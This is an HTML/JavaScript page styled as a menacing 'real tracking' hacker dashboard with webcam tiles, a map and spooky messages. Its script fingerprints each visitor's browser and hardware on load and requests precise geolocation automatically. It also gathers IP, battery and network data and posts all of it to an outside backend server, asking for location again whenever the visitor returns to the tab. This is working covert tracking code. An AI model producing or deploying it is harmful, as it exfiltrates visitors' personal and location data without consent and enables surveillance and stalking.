<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚠️ H O L L O W ⚠️</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .header {
            border: 2px solid #00ff00;
            padding: 20px;
            margin-bottom: 20px;
            background: rgba(0, 20, 0, 0.9);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }

        .stat-card {
            border: 2px solid #00ff00;
            padding: 15px;
            background: rgba(0, 0, 0, 0.8);
        }

        .satellite-container {
            border: 2px solid #00ff00;
            padding: 15px;
            margin-bottom: 20px;
            background: rgba(0, 0, 0, 0.8);
        }

        #satelliteMap {
            width: 100%;
            height: 400px;
            border: 2px solid #00ff00;
            margin-bottom: 10px;
        }

        .camera-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }

        .camera-feed {
            border: 2px solid #00ff00;
            padding: 10px;
            background: rgba(0, 0, 0, 0.8);
        }

        .camera-feed img {
            width: 100%;
            height: 200px;
            object-fit: cover;
            filter: grayscale(100%) contrast(1.2);
        }

        .data-panel {
            border: 2px solid #00ff00;
            padding: 10px;
            margin-top: 10px;
            max-height: 200px;
            overflow-y: auto;
            font-size: 12px;
        }

        .btn {
            background: black;
            color: #00ff00;
            border: 2px solid #00ff00;
            padding: 10px 20px;
            margin: 5px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            transition: all 0.3s;
        }

        .btn:hover {
            background: #00ff00;
            color: black;
            box-shadow: 0 0 20px #00ff00;
        }

        .threat-meter {
            width: 100%;
            height: 30px;
            border: 2px solid #00ff00;
            margin: 10px 0;
            position: relative;
        }

        .threat-fill {
            height: 100%;
            background: #ff0000;
            width: 0%;
            transition: width 0.3s;
        }

        .coords {
            font-size: 24px;
            text-align: center;
            margin: 10px 0;
            color: #00ff00;
            text-shadow: 0 0 10px #00ff00;
        }

        .hidden {
            display: none;
        }

        #terminal {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 400px;
            height: 300px;
            background: rgba(0, 0, 0, 0.95);
            border: 2px solid #00ff00;
            padding: 10px;
            overflow-y: auto;
            font-size: 12px;
            z-index: 9999;
        }

        .terminal-line {
            color: #00ff00;
            margin: 2px 0;
            border-bottom: 1px solid rgba(0, 255, 0, 0.2);
        }

        .glitch {
            animation: glitch 1s infinite;
        }

        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(2px, -2px); }
            60% { transform: translate(-2px, -2px); }
            80% { transform: translate(2px, 2px); }
            100% { transform: translate(0); }
        }
    </style>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1 class="glitch">🔮 NEXUS://REAL_TRACKING v1.0</h1>
            <div id="userInfo"></div>
            <div class="threat-meter">
                <div class="threat-fill" id="threatLevel"></div>
            </div>
            <div id="coordinates" class="coords">--.--, --.--</div>
        </div>

        <!-- Stats Grid -->
        <div class="stats-grid">
            <div class="stat-card">
                <h3>📍 YOUR LOCATION</h3>
                <div id="locationDetails">Acquiring...</div>
                <button class="btn" onclick="getExactLocation()">📍 GET EXACT LOCATION</button>
            </div>
            
            <div class="stat-card">
                <h3>💻 SYSTEM FINGERPRINT</h3>
                <div id="systemDetails">Acquiring...</div>
                <button class="btn" onclick="deepScan()">🔬 DEEP SCAN</button>
            </div>
            
            <div class="stat-card">
                <h3>🌐 NETWORK INFO</h3>
                <div id="networkDetails">Acquiring...</div>
            </div>
        </div>

        <!-- Satellite Imagery -->
        <div class="satellite-container">
            <h3>🛰️ LIVE SATELLITE IMAGERY</h3>
            <div id="satelliteMap"></div>
            <div style="display: flex; gap: 10px; margin-top: 10px;">
                <button class="btn" onclick="refreshSatellite()">🔄 REFRESH</button>
                <button class="btn" onclick="toggleSatelliteLayer()">🌍 TOGGLE LAYER</button>
                <button class="btn" onclick="centerOnLocation()">🎯 CENTER ON ME</button>
            </div>
            <div id="satelliteInfo" class="data-panel"></div>
        </div>

        <!-- Camera Network -->
        <h3>📡 LIVE CAMERA NETWORK</h3>
        <div class="camera-grid" id="cameraGrid"></div>

        <!-- Data Panels -->
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
            <div class="stat-card">
                <h3>🎲 REAL RANDOM NUMBERS</h3>
                <div id="randomNumbers">-- -- -- -- --</div>
                <button class="btn" onclick="generateRandom()">🎲 GENERATE (Quantum)</button>
                <div id="randomSource" class="data-panel"></div>
            </div>
            
            <div class="stat-card">
                <h3>📨 ENCRYPTED MESSAGES</h3>
                <div id="messages"></div>
                <button class="btn" onclick="fetchMessages()">📩 FETCH</button>
            </div>
        </div>

        <!-- Terminal -->
        <div id="terminal">
            <div>>> NEXUS TERMINAL v1.0 <<</div>
            <div id="terminalOutput"></div>
        </div>
    </div>

    <script>
        // ==================== CONFIGURATION ====================;
        const BACKEND_URL = 'https://b-n1nt.onrender.com'; // Your FastAPI backend

        // ==================== GLOBAL VARIABLES ====================
        let map;
        let satelliteLayer;
        let currentLocation = null;
        let threatLevel = 0;
        let userData = {};

        // ==================== INITIALIZATION ====================
        document.addEventListener('DOMContentLoaded', async () => {
            await collectSystemInfo();
            await getNetworkInfo();
            initMap();
            startTerminal();
            await fetchCameras();
            await fetchMessages();
            
            // Auto refresh every 30 seconds
            setInterval(refreshSatellite, 30000);
            setInterval(fetchCameras, 60000);
        });

        // ==================== REAL LOCATION TRACKING ====================
        async function getExactLocation() {
            terminalLog('📍 Requesting exact location...');
            
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    terminalLog('❌ Geolocation not supported');
                    reject('Geolocation not supported');
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        currentLocation = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            heading: position.coords.heading,
                            speed: position.coords.speed
                        };

                        document.getElementById('coordinates').textContent = 
                            `${currentLocation.lat.toFixed(6)}, ${currentLocation.lon.toFixed(6)}`;

                        // Reverse geocoding
                        await reverseGeocode(currentLocation.lat, currentLocation.lon);
                        
                        // Update satellite view
                        centerOnLocation();
                        
                        // Send to backend
                        await sendToBackend('location', currentLocation);
                        
                        terminalLog(`✅ Location acquired (accuracy: ${currentLocation.accuracy.toFixed(1)}m)`);
                        
                        // Increase threat level
                        updateThreatLevel(30);
                        
                        resolve(currentLocation);
                    },
                    (error) => {
                        terminalLog(`❌ Location error: ${error.message}`);
                        
                        // Fallback to IP geolocation
                        getIPLocation();
                        reject(error);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        // IP-based geolocation fallback
        async function getIPLocation() {
            terminalLog('🌐 Falling back to IP geolocation...');
            
            try {
                const response = await fetch('http://ip-api.com/json/');
                const data = await response.json();
                
                if (data.status === 'success') {
                    currentLocation = {
                        lat: data.lat,
                        lon: data.lon,
                        accuracy: 1000, // IP accuracy is low
                        city: data.city,
                        region: data.regionName,
                        country: data.country,
                        zip: data.zip,
                        isp: data.isp
                    };
                    
                    document.getElementById('coordinates').textContent = 
                        `${currentLocation.lat.toFixed(6)}, ${currentLocation.lon.toFixed(6)}`;
                    
                    document.getElementById('locationDetails').innerHTML = `
                        <b>IP Location (Fallback)</b><br>
                        City: ${data.city}<br>
                        Region: ${data.regionName}<br>
                        Country: ${data.country}<br>
                        ZIP: ${data.zip}<br>
                        ISP: ${data.isp}<br>
                        <small>Accuracy: ~1km</small>
                    `;
                    
                    centerOnLocation();
                    await sendToBackend('location', currentLocation);
                    terminalLog(`📍 IP Location: ${data.city}, ${data.country}`);
                }
            } catch (error) {
                terminalLog(`❌ IP location failed: ${error.message}`);
            }
        }

        // Reverse geocoding
        async function reverseGeocode(lat, lon) {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                const data = await response.json();
                
                document.getElementById('locationDetails').innerHTML = `
                    <b>Exact Location</b><br>
                    Address: ${data.display_name || 'Unknown'}<br>
                    Lat: ${lat.toFixed(6)}<br>
                    Lon: ${lon.toFixed(6)}<br>
                    Accuracy: ${currentLocation.accuracy.toFixed(1)}m<br>
                    Altitude: ${currentLocation.altitude || 'N/A'}m
                `;
                
                terminalLog(`📍 Address: ${data.display_name?.substring(0, 50)}...`);
            } catch (error) {
                console.error('Reverse geocoding failed:', error);
            }
        }

        // ==================== SYSTEM FINGERPRINTING ====================
        async function collectSystemInfo() {
            terminalLog('💻 Collecting system fingerprint...');
            
            userData = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory || 'unknown',
                maxTouchPoints: navigator.maxTouchPoints,
                vendor: navigator.vendor,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                pdfViewerEnabled: navigator.pdfViewerEnabled,
                webdriver: navigator.webdriver,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                referrer: document.referrer || 'direct',
                timestamp: new Date().toISOString()
            };

            // Canvas fingerprinting
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 200;
                canvas.height = 200;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(10, 10, 100, 100);
                ctx.fillStyle = '#069';
                ctx.fillText('FINGERPRINT', 20, 50);
                userData.canvasFingerprint = canvas.toDataURL().substring(0, 100);
            } catch (e) {}

            // WebGL fingerprinting
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                if (gl) {
                    userData.webgl = {
                        vendor: gl.getParameter(gl.VENDOR),
                        renderer: gl.getParameter(gl.RENDERER)
                    };
                }
            } catch (e) {}

            // Display system info
            document.getElementById('systemDetails').innerHTML = `
                <b>Browser:</b> ${userData.userAgent.substring(0, 50)}...<br>
                <b>Platform:</b> ${userData.platform}<br>
                <b>Cores:</b> ${userData.hardwareConcurrency}<br>
                <b>Memory:</b> ${userData.deviceMemory}GB<br>
                <b>Screen:</b> ${userData.screen.width}x${userData.screen.height}<br>
                <b>Timezone:</b> ${userData.timezone}
            `;

            await sendToBackend('system', userData);
        }

        async function deepScan() {
            terminalLog('🔬 Performing deep system scan...');
            
            // Get battery info
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                userData.battery = {
                    level: battery.level * 100,
                    charging: battery.charging
                };
            }

            // Get connection info
            if ('connection' in navigator) {
                const conn = navigator.connection;
                userData.network = {
                    type: conn.effectiveType,
                    rtt: conn.rtt,
                    downlink: conn.downlink,
                    saveData: conn.saveData
                };
            }

            document.getElementById('systemDetails').innerHTML += `
                <br><b>Battery:</b> ${userData.battery?.level || '?'}%<br>
                <b>Network:</b> ${userData.network?.type || '?'}<br>
                <b>RTT:</b> ${userData.network?.rtt || '?'}ms
            `;

            updateThreatLevel(15);
            await sendToBackend('deep_scan', userData);
        }

        // ==================== NETWORK INFO ====================
        async function getNetworkInfo() {
            const networkInfo = {
                ip: await getIP(),
                connection: navigator.connection || {},
                online: navigator.onLine
            };

            document.getElementById('networkDetails').innerHTML = `
                <b>IP:</b> ${networkInfo.ip || 'Unknown'}<br>
                <b>Status:</b> ${networkInfo.online ? '🟢 Online' : '🔴 Offline'}<br>
                <b>Connection:</b> ${networkInfo.connection.effectiveType || 'Unknown'}<br>
                <b>RTT:</b> ${networkInfo.connection.rtt || '?'}ms<br>
                <b>Downlink:</b> ${networkInfo.connection.downlink || '?'} Mbps
            `;
        }

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Unknown';
            }
        }

        // ==================== SATELLITE IMAGERY ====================
        function initMap() {
            map = L.map('satelliteMap').setView([0, 0], 2);
            
            // Regular streets layer
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '© OpenStreetMap'
            }).addTo(map);
            
            // Satellite layer (using ESRI satellite)
            satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
                attribution: '© Esri'
            });
            
            // Try to get location immediately
            setTimeout(getExactLocation, 1000);
        }

        function toggleSatelliteLayer() {
            if (map.hasLayer(satelliteLayer)) {
                map.removeLayer(satelliteLayer);
            } else {
                map.addLayer(satelliteLayer);
            }
        }

        function refreshSatellite() {
            if (currentLocation) {
                // Refresh by recentering
                map.setView([currentLocation.lat, currentLocation.lon], map.getZoom());
                terminalLog('🛰️ Satellite view refreshed');
                
                // Add a marker at current location
                L.marker([currentLocation.lat, currentLocation.lon]).addTo(map)
                    .bindPopup('Your location')
                    .openPopup();
            }
        }

        function centerOnLocation() {
            if (currentLocation) {
                map.setView([currentLocation.lat, currentLocation.lon], 18);
                refreshSatellite();
            }
        }

        // ==================== CAMERA NETWORK ====================
        async function fetchCameras() {
            terminalLog('📡 Scanning for cameras...');
            
            try {
                // Using OpenStreetMap cameras and public traffic cams
                const cameras = [
                    {
                        name: "Helsinki Traffic Cam",
                        url: "https://weathercam.digitraffic.fi/C0151301.jpg",
                        country: "Finland",
                        lat: 60.233,
                        lon: 24.866
                    },
                    {
                        name: "London Traffic Cam",
                        url: "https://www.tfl.gov.uk/tfl/livetravelnews/trafficcameras/beckton.gif",
                        country: "UK",
                        lat: 51.507,
                        lon: -0.127
                    },
                    {
                        name: "New York Traffic Cam",
                        url: "https://webcams.nyctmc.org/google_popup.php?cid=100",
                        country: "USA",
                        lat: 40.712,
                        lon: -74.006
                    },
                    {
                        name: "Tokyo Highway Cam",
                        url: "https://www.shutoko.jp/use/camera/camera-image/01.jpg",
                        country: "Japan",
                        lat: 35.676,
                        lon: 139.650
                    },
                    {
                        name: "Sydney Traffic Cam",
                        url: "https://www.livetraffic.com/camera/029-001.jpg",
                        country: "Australia",
                        lat: -33.868,
                        lon: 151.209
                    }
                ];

                const cameraGrid = document.getElementById('cameraGrid');
                cameraGrid.innerHTML = '';

                cameras.forEach(cam => {
                    const distance = currentLocation ? 
                        calculateDistance(currentLocation.lat, currentLocation.lon, cam.lat, cam.lon).toFixed(1) : 
                        '?';

                    cameraGrid.innerHTML += `
                        <div class="camera-feed">
                            <h4>${cam.name}</h4>
                            <img src="${cam.url}" onerror="this.src='https://via.placeholder.com/300x200?text=Camera+Offline'">
                            <div class="data-panel">
                                Country: ${cam.country}<br>
                                Distance: ${distance}km<br>
                                <button class="btn" onclick="viewOnMap(${cam.lat}, ${cam.lon})">📍 View on Map</button>
                            </div>
                        </div>
                    `;
                });

                terminalLog(`📡 Found ${cameras.length} cameras`);
                await sendToBackend('cameras', { count: cameras.length });
                
            } catch (error) {
                terminalLog(`❌ Camera scan failed: ${error.message}`);
            }
        }

        function calculateDistance(lat1, lon1, lat2, lon2) {
            const R = 6371;
            const dLat = (lat2 - lat1) * Math.PI / 180;
            const dLon = (lon2 - lon1) * Math.PI / 180;
            const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
                     Math.cos(lat1 * Math.PI/180) * Math.cos(lat2 * Math.PI/180) * 
                     Math.sin(dLon/2) * Math.sin(dLon/2);
            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
            return R * c;
        }

        function viewOnMap(lat, lon) {
            map.setView([lat, lon], 15);
        }

        // ==================== QUANTUM RANDOM NUMBERS ====================
        async function generateRandom() {
            terminalLog('🎲 Generating quantum random numbers...');
            
            try {
                // Using random.org API (true random numbers)
                const response = await fetch('https://www.random.org/integers/?num=5&min=1&max=100&col=1&base=10&format=plain&rnd=new');
                const text = await response.text();
                const numbers = text.trim().split('\n').map(n => parseInt(n));
                
                document.getElementById('randomNumbers').textContent = numbers.join(' - ');
                document.getElementById('randomSource').innerHTML = `
                    Source: random.org (atmospheric noise)<br>
                    Generated: ${new Date().toLocaleTimeString()}
                `;
                
                await sendToBackend('random', { numbers });
                
                // Check for special numbers
                if (numbers.includes(42) || numbers.includes(23) || numbers.includes(66)) {
                    updateThreatLevel(10);
                }
                
            } catch (error) {
                // Fallback to crypto random
                const numbers = [];
                for (let i = 0; i < 5; i++) {
                    numbers.push(crypto.getRandomValues(new Uint32Array(1))[0] % 100 + 1);
                }
                document.getElementById('randomNumbers').textContent = numbers.join(' - ');
                document.getElementById('randomSource').innerHTML = 'Source: Crypto API (fallback)';
            }
        }

        // ==================== ENCRYPTED MESSAGES ====================
        async function fetchMessages() {
            try {
                const response = await fetch(`${BACKEND_URL}/api/messages`);
                const data = await response.json();
                
                document.getElementById('messages').innerHTML = data.messages.map(msg => `
                    <div style="border-bottom: 1px solid #0f0; padding: 5px;">
                        <b>FROM:</b> ${msg.sender}<br>
                        <b>SUBJ:</b> ${msg.subject}<br>
                        <small>${msg.time}</small>
                    </div>
                `).join('');
                
            } catch (error) {
                // Fallback messages
                const messages = [
                    { sender: 'SYSTEM', subject: 'Location ping received', time: new Date().toLocaleTimeString() },
                    { sender: 'UNKNOWN', subject: 'They are watching', time: new Date().toLocaleTimeString() },
                    { sender: 'DARKWEB', subject: 'Your data is for sale', time: new Date().toLocaleTimeString() }
                ];
                
                document.getElementById('messages').innerHTML = messages.map(msg => `
                    <div style="border-bottom: 1px solid #0f0; padding: 5px;">
                        <b>FROM:</b> ${msg.sender}<br>
                        <b>SUBJ:</b> ${msg.subject}<br>
                        <small>${msg.time}</small>
                    </div>
                `).join('');
            }
        }

        // ==================== BACKEND COMMUNICATION ====================
        async function sendToBackend(type, data) {
            try {
                const response = await fetch(`${BACKEND_URL}/api/track`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        type: type,
                        data: data,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent
                    })
                });
                
                const result = await response.json();
                terminalLog(`📡 Sent to backend: ${type}`);
                
            } catch (error) {
                console.error('Backend error:', error);
            }
        }

        // ==================== THREAT SYSTEM ====================
        function updateThreatLevel(increase) {
            threatLevel = Math.min(100, threatLevel + increase);
            document.getElementById('threatLevel').style.width = threatLevel + '%';
            
            if (threatLevel > 75) {
                document.body.style.animation = 'glitch 0.5s infinite';
            }
        }

        // ==================== TERMINAL ====================
        function startTerminal() {
            setInterval(() => {
                const output = document.getElementById('terminalOutput');
                const lines = output.innerHTML.split('<br>');
                if (lines.length > 20) {
                    lines.pop();
                    output.innerHTML = lines.join('<br>');
                }
            }, 5000);
        }

        function terminalLog(message) {
            const output = document.getElementById('terminalOutput');
            const time = new Date().toLocaleTimeString();
            output.innerHTML = `<div class="terminal-line">[${time}] ${message}</div>` + output.innerHTML;
        }

        // ==================== AUTO TRIGGERS ====================
        setInterval(() => {
            if (currentLocation) {
                refreshSatellite();
            }
        }, 30000);

        // Track page visibility
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                terminalLog('👁️ User left page');
            } else {
                terminalLog('👁️ User returned');
                getExactLocation();
            }
        });
    </script>
</body>
</html>
